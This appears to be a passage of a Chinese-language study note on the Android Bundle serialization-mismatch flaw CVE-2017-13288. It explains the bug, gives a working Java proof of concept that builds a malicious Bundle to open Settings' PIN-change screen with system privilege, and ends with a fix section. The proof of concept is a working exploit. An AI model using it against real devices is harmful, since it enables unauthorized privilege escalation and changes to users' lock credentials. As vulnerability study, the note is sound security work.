+<p>在<span class="heti-skip"><span class="heti-spacing"> </span>system_server<span class="heti-spacing"> </span></span>中，<span>Bundle<span class="heti-spacing"> </span></span>被反序列化，生成一个<span class="heti-skip"><span class="heti-spacing"> </span>PeriodicAdvertisingReport<span class="heti-spacing"> </span></span>对象，读取了 <code>syncHandle</code>、<code>txPower</code>、<code>rssi</code>、<code>dataStatus</code>以及<code>data</code>（均为<span><span class="heti-spacing"> </span>1</span>），此时<span class="heti-skip"><span class="heti-spacing"> </span>intent<span class="heti-spacing"> </span></span>是一个<span class="heti-skip"><span class="heti-spacing"> </span>ByteArray<span class="heti-spacing"> </span></span>中的值，因此绕过了 <code>checkKeyIntent</code> 检查。</p>
+<p>随后<span class="heti-skip"><span class="heti-spacing"> </span>system_server<span class="heti-spacing"> </span></span>将<span class="heti-skip"><span class="heti-spacing"> </span>Bundle<span class="heti-spacing"> </span></span>序列化，由于此时<code>txPower</code>作为长整型被写入（相当于多出了一个<span class="heti-skip"><span class="heti-spacing"> </span>int<span class="heti-spacing"> </span></span>为<span><span class="heti-spacing"> </span>0</span>），因此占据了<span class="heti-skip"><span class="heti-spacing"> </span>8<span class="heti-spacing"> </span></span>个字节，后面的内容不变。</p>
+<p>在<span class="heti-skip"><span class="heti-spacing"> </span>Settings<span class="heti-spacing"> </span></span>中<span class="heti-skip"><span class="heti-spacing"> </span>Bundle<span class="heti-spacing"> </span></span>反序列化，读取<code>txPower</code>时使用<code>readInt</code>函数，因此仅读取了其中的<span class="heti-skip"><span class="heti-spacing"> </span>4<span class="heti-spacing"> </span></span>位，而多出的<span class="heti-skip"><span class="heti-spacing"> </span>4<span class="heti-spacing"> </span></span>位导致了数据位置的偏移。随后读到的 <code>rssi</code>为<span><span class="heti-spacing"> </span>0</span>（多出的<span class="heti-skip"><span class="heti-spacing"> </span>4<span class="heti-spacing"> </span></span>位），<code>dataStatus</code>为<span><span class="heti-spacing"> </span>1</span>（原<code>rssi</code>），<code>flag</code> 为<span><span class="heti-spacing"> </span>1</span>（原<code>dataStatus</code>），原<code>flag</code>中的<span class="heti-skip"><span class="heti-spacing"> </span>1<span class="heti-spacing"> </span></span>被当作 <code>data</code> 的长度读入，而原<code>data</code>的长度则变成了<code>data</code> 的内容。此时该<span class="heti-skip"><span class="heti-spacing"> </span>PeriodicAdvertisingReport<span class="heti-spacing"> </span></span>对象读取完毕，而由于偏移多出的，存在于原来的<code>data</code>之中的<span class="heti-skip"><span class="heti-spacing"> </span>intent<span class="heti-spacing"> </span></span>则替代原来的第二个键值对而暴露出来，最终实现以<span class="heti-skip"><span class="heti-spacing"> </span>Settings<span class="heti-spacing"> </span></span>应用的<span class="heti-skip"><span class="heti-spacing"> </span>system<span class="heti-spacing"> </span></span>权限启动任意<span><span class="heti-spacing"> </span>Activity</span>，也就实现了攻击。</p>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
+<p>下面通过实现一个简单应用的框架复现<span class="heti-skip"><span class="heti-spacing"> </span>CVE-2017-13288<span class="heti-spacing"> </span></span>漏洞，实现越权修改手机<span class="heti-skip"><span class="heti-spacing"> </span>PIN<span class="heti-spacing"> </span></span>密码。</p>
+<h3 id="authenticatorservice">提供<span class="heti-skip"><span class="heti-spacing"> </span>AuthenticatorService<span class="heti-spacing"> </span></span>服务<a class="headerlink" href="#authenticatorservice" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>首先为了能够利用<span class="heti-skip"><span class="heti-spacing"> </span>Settings<span class="heti-spacing"> </span></span>的权限，同<span class="heti-skip"><span class="heti-spacing"> </span>LaunchAnyWhere<span class="heti-spacing"> </span></span>的实现方法，要先在<span class="heti-skip"><span class="heti-spacing"> </span>AndroidManifest.xml<span class="heti-spacing"> </span></span>中注册实现<span><span class="heti-spacing"> </span>AuthenticatorService</span>：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;service</span>
+<span class="w">    </span><span class="na">android:name=</span><span class="s">".AuthenticatorService"</span>
+<span class="w">    </span><span class="na">android:enabled=</span><span class="s">"true"</span>
+<span class="w">    </span><span class="na">android:exported=</span><span class="s">"true"</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nt">&lt;intent-filter&gt;</span>
+<span class="w">        </span><span class="nt">&lt;action</span><span class="w"> </span><span class="na">android:name=</span><span class="s">"android.accounts.AccountAuthenticator"</span><span class="nt">/&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/intent-filter&gt;</span>
+<span class="w">    </span><span class="nt">&lt;meta-data</span><span class="w"> </span><span class="na">android:name=</span><span class="s">"android.accounts.AccountAuthenticator"</span>
+<span class="w">        </span><span class="na">android:resource=</span><span class="s">"@xml/authenticator"</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/meta-data&gt;</span>
+<span class="nt">&lt;/service&gt;</span>
+</code></pre></div>
+<h3 id="myauthenticator">实现<span><span class="heti-spacing"> </span>MyAuthenticator</span><a class="headerlink" href="#myauthenticator" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>在<span class="heti-skip"><span class="heti-spacing"> </span>AccountAuthenticator<span class="heti-spacing"> </span></span>中的<code>addAccount</code> 构造恶意<span><span class="heti-spacing"> </span>Bundle</span></p>
+<p>函数实现如下：</p>
+<div class="highlight"><pre><span></span><code><span class="nd">@Override</span>
+<span class="kd">public</span><span class="w"> </span><span class="n">Bundle</span><span class="w"> </span><span class="nf">addAccount</span><span class="p">(</span><span class="n">AccountAuthenticatorResponse</span><span class="w"> </span><span class="n">accountAuthenticatorResponse</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">strings</span><span class="p">,</span><span class="w"> </span><span class="n">Bundle</span><span class="w"> </span><span class="n">bundle</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">NetworkErrorException</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">Log</span><span class="p">.</span><span class="na">v</span><span class="p">(</span><span class="n">TAG</span><span class="p">,</span><span class="s">"addAccount"</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">Bundle</span><span class="w"> </span><span class="n">evil</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Bundle</span><span class="p">();</span>
+<span class="w">    </span><span class="n">Parcel</span><span class="w"> </span><span class="n">bndlData</span><span class="o">=</span><span class="n">Parcel</span><span class="p">.</span><span class="na">obtain</span><span class="p">();</span>
+<span class="w">    </span><span class="n">Parcel</span><span class="w"> </span><span class="n">pcelData</span><span class="o">=</span><span class="n">Parcel</span><span class="p">.</span><span class="na">obtain</span><span class="p">();</span>
+
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span><span class="w">  </span><span class="c1">// 键值对的数量</span>
+<span class="w">    </span><span class="c1">// 以下是第一个键值对</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeString</span><span class="p">(</span><span class="s">"mismatch"</span><span class="p">);</span><span class="w"> </span><span class="c1">// Key</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span><span class="w">  </span><span class="c1">// 表示 Parcelabel 类型</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeString</span><span class="p">(</span><span class="s">"android.bluetooth.le.PeriodicAdvertisingReport"</span><span class="p">);</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w">  </span><span class="c1">// syncHandle</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w">  </span><span class="c1">// txPower</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w">  </span><span class="c1">// rssi</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w">  </span><span class="c1">// dataStatus</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w">  </span><span class="c1">// flag</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span><span class="w"> </span><span class="c1">// 恶意KEY_INTENT的长度，暂时写入-1，完成写入后再修改</span>
+
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">keyIntentStartPos</span><span class="o">=</span><span class="n">pcelData</span><span class="p">.</span><span class="na">dataPosition</span><span class="p">();</span><span class="w"> </span><span class="c1">// 记下 intent 的起始位置</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeString</span><span class="p">(</span><span class="n">AccountManager</span><span class="p">.</span><span class="na">KEY_INTENT</span><span class="p">);</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span><span class="w">  </span><span class="c1">// 表示 Parcelabel 类型</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeString</span><span class="p">(</span><span class="s">"android.content.Intent"</span><span class="p">);</span><span class="w"> </span>
+<span class="w">    </span><span class="c1">//以下是该 intent 的内容</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeString</span><span class="p">(</span><span class="n">Intent</span><span class="p">.</span><span class="na">ACTION_RUN</span><span class="p">);</span><span class="w">  </span><span class="c1">// Intent Action</span>
+<span class="w">    </span><span class="n">Uri</span><span class="p">.</span><span class="na">writeToParcel</span><span class="p">(</span><span class="n">pcelData</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">  </span><span class="c1">// uri = null</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeString</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">  </span><span class="c1">// mType = null</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mh">0x10000000</span><span class="p">);</span><span class="w">  </span><span class="c1">// Flags</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeString</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">  </span><span class="c1">// mPackage = null</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeString</span><span class="p">(</span><span class="s">"com.android.settings"</span><span class="p">);</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeString</span><span class="p">(</span><span class="s">"com.android.settings.password.ChooseLockPassword"</span><span class="p">);</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">  </span><span class="c1">// mSourceBounds = null</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">  </span><span class="c1">// mCategories = null</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">  </span><span class="c1">// mSelector = null</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">  </span><span class="c1">// mClipData = null</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span><span class="w"> </span><span class="c1">// mContentUserHint</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeBundle</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">keyIntentEndPos</span><span class="o">=</span><span class="n">pcelData</span><span class="p">.</span><span class="na">dataPosition</span><span class="p">();</span><span class="w"> </span><span class="c1">// intent 的终止位置</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">lengthOfKeyIntent</span><span class="o">=</span><span class="n">keyIntentEndPos</span><span class="o">-</span><span class="n">keyIntentStartPos</span><span class="p">;</span><span class="w"> </span><span class="c1">// intent 的长度</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">setDataPosition</span><span class="p">(</span><span class="n">keyIntentStartPos</span><span class="o">-</span><span class="mi">4</span><span class="p">);</span><span class="w">  </span><span class="c1">// 移动指针到指定位置</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="n">lengthOfKeyIntent</span><span class="p">);</span><span class="w">  </span><span class="c1">// 写入 intent 长度</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">setDataPosition</span><span class="p">(</span><span class="n">keyIntentEndPos</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Log</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">TAG</span><span class="p">,</span><span class="w"> </span><span class="s">"Length of KEY_INTENT is 0x"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">toHexString</span><span class="p">(</span><span class="n">lengthOfKeyIntent</span><span class="p">));</span>
+<span class="w">    </span><span class="c1">// 以下是第二个键值对</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeString</span><span class="p">(</span><span class="s">"Padding-Key"</span><span class="p">);</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">  </span><span class="c1">// 表示 String 类型</span>
+<span class="w">    </span><span class="n">pcelData</span><span class="p">.</span><span class="na">writeString</span><span class="p">(</span><span class="s">"Padding-Value"</span><span class="p">);</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcelData</span><span class="p">.</span><span class="na">dataSize</span><span class="p">();</span>
+<span class="w">    </span><span class="n">Log</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">TAG</span><span class="p">,</span><span class="s">"length = "</span><span class="o">+</span><span class="n">length</span><span class="p">);</span>
+<span class="w">    </span><span class="n">bndlData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="n">length</span><span class="p">);</span>
+<span class="w">    </span><span class="n">bndlData</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mh">0x4c444e42</span><span class="p">);</span><span class="w">  </span><span class="c1">// Bundle 魔数</span>
+<span class="w">    </span><span class="n">bndlData</span><span class="p">.</span><span class="na">appendFrom</span><span class="p">(</span><span class="n">pcelData</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
+<span class="w">    </span><span class="n">bndlData</span><span class="p">.</span><span class="na">setDataPosition</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">evil</span><span class="p">.</span><span class="na">readFromParcel</span><span class="p">(</span><span class="n">bndlData</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Log</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">TAG</span><span class="p">,</span><span class="n">evil</span><span class="p">.</span><span class="na">toString</span><span class="p">());</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">evil</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="mainactivity">在<span class="heti-skip"><span class="heti-spacing"> </span>MainActivity<span class="heti-spacing"> </span></span>中请求添加账户<a class="headerlink" href="#mainactivity" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>通过应用自行请求添加账户从而触发漏洞而不需要用户在设置中手动添加用户。代码略。</p>
+<h3 id="bundle_1">输出恶意<span class="heti-skip"><span class="heti-spacing"> </span>Bundle<span class="heti-spacing"> </span></span>的内容<a class="headerlink" href="#bundle_1" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>用于调试于更直观的理解。代码略。</p>
+<h3 id="_5">复现攻击<a class="headerlink" href="#_5" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>运行应用，可以看见成功跳转至设置密码界面</p>
+<p><img alt="img1" src="https://gooduckz.github.io/note/assets/images/i2cs/img1.png"/></p>
+<p>在日志中也输出了相应信息：</p>
+<p><img alt="img2" src="https://gooduckz.github.io/note/assets/images/i2cs/img2.png"/></p>
+<p>用<span class="heti-skip"><span class="heti-spacing"> </span>010 Editor<span class="heti-spacing"> </span></span>打开输出的<span class="heti-skip"><span class="heti-spacing"> </span>Bundle<span class="heti-spacing"> </span></span>也可以非常方便地分析攻击的实现：</p>
+<p><img alt="img3" src="https://gooduckz.github.io/note/assets/images/i2cs/img3.png"/></p>
+<p>其中前四个字节存放<span class="heti-skip"><span class="heti-spacing"> </span>Bundle<span class="heti-spacing"> </span></span>大小<code>0x220</code>，随后四个字节为<span class="heti-skip"><span class="heti-spacing"> </span>Bundle<span class="heti-spacing"> </span></span>魔数 <code>0x4c444e42</code>，再随后是键值对个数。更多具体分析见<code>addAccount</code>函数中的注释内容。</p>
+<h2 id="_6">漏洞修复<a class="headerlink" href="#_6" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
+<p>仅仅就修复该漏洞而言，只需将<code>writeToParcel</code>中的<code>writeLong</code>改为<code>writeInt</code>即可。但事实上这个方式仅仅解决了这一个不匹配漏洞，而同类型的漏洞在近年来一直被不断地挖掘与利用。因此可以尝试通过更多的其他方案实现威胁的缓释，例如可以通过在结构、容器的头部记录对应数据的大小等，当发生序列化与反序列化不匹配时也不会因此而导致完全错位。</p>
+<h2 id="reference">Reference<a class="headerlink" href="#reference" title="Permanent link">¶</a></h2>
+<p>[1] NVD - CVE-2017-13288. <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-13288">https://nvd.nist.gov/vuln/detail/CVE-2017-13288</a></p>
+<p>[2] NVD - CVE-2023-20963. <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-20963">https://nvd.nist.gov/vuln/detail/CVE-2023-20963</a></p>
+<p>[3] Git at Google, PeriodicAdvertisingReport.java. <a href="https://android.googlesource.com/platform/frameworks/base/+/4525320403bfb85eb1629f9b43718970491f98ed/core/java/android/bluetooth/le/PeriodicAdvertisingReport.java">https://android.googlesource.com/platform/frameworks/base/+/4525320403bfb85eb1629f9b43718970491f98ed/core/java/android/bluetooth/le/PeriodicAdvertisingReport.java</a></p>
+<p>[4] 1ce0ear, Bundle Fengshui Study. <a href="https://1ce0ear.github.io/2020/05/14/bundle-fengshui-1/">https://1ce0ear.github.io/2020/05/14/bundle-fengshui-1/</a></p>
+<p><span>[5] Tr0e, Android LaunchAnywhere<span class="heti-spacing"> </span></span>组件权限绕过漏洞<span><span class="heti-spacing"> </span>.</span><a href="https://blog.csdn.net/weixin_39190897/article/details/125030718"><span><span class="heti-spacing"> </span>https://blog.csdn.net/weixin_39190897/article/details/125030718</span></a></p>
+<p>[6] stven0king, launchanywhere. <a href="https://github.com/stven0king/launchanywhere/blob/main/file/bundle-fengshui.md">https://github.com/stven0king/launchanywhere/blob/main/file/bundle-fengshui.md</a></p>
+<p>[7] Android Developers, WorkSource. <a href="https://developer.android.com/reference/android/os/WorkSource">https://developer.android.com/reference/android/os/WorkSource</a></p>
+<p>[8] Git at Google, WorkSource.java. <a href="https://android.googlesource.com/platform/frameworks/base/+/266b3bddcf14d448c0972db64b42950f76c759e3/core/java/android/os/WorkSource.java">https://android.googlesource.com/platform/frameworks/base/+/266b3bddcf14d448c0972db64b42950f76c759e3/core/java/android/os/WorkSource.java</a></p>
+<p><span>[9]<span class="heti-spacing"> </span></span>深蓝<span class="heti-skip"><span class="heti-spacing"> </span>DarkNavy, 2022<span class="heti-spacing"> </span></span>年度最“不可赦”漏洞<span><span class="heti-spacing"> </span>.</span><a href="https://mp.weixin.qq.com/s/P_EYQxOEupqdU0BJMRqWsw"><span><span class="heti-spacing"> </span>https://mp.weixin.qq.com/s/P_EYQxOEupqdU0BJMRqWsw</span></a></p>
+<p>[10] davincifans123, pinduoduo_backdoor. <a href="https://github.com/davincifans123/pinduoduo_backdoor">https://github.com/davincifans123/pinduoduo_backdoor</a></p>
+</article>
+</div>
+</div>
+</main>
+<footer class="md-footer">
+<div class="md-footer-meta md-typeset">
+<div class="md-footer-meta__inner md-grid">
+<div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
+      Material for MkDocs
+    </a>
+</div>
+</div>
+</div>
+</footer>
+</div>
+<div class="md-dialog" data-md-component="dialog">
+<div class="md-dialog__inner md-typeset"></div>
+</div>
+<script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+<script src="../../assets/javascripts/bundle.2a6f1dda.min.js"></script>
+<script src="../../js/mathjax.js"></script>
+<script src="../../js/toc.js"></script>
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</body>
+</html>
